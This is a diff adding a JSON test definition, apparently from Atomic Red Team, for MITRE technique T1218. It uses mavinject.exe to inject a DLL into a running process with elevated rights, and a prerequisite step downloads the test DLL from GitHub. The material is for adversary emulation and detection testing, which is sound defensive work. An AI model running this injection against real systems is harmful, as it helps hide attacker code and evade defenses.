@@ -1,0 +1,42 @@
+{
+    "name": "mavinject - Inject DLL into running process",
+    "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1218",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "System Binary Proxy Execution",
+    "source": "ART",
+    "uuid": "c426dacf-575d-4937-8611-a148a86a5e61",
+    "arguments": {
+        "process_id": {
+            "description": "PID of process receiving injection",
+            "type": "string",
+            "default": "1000"
+        },
+        "dll_payload": {
+            "description": "DLL to inject",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
+            "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
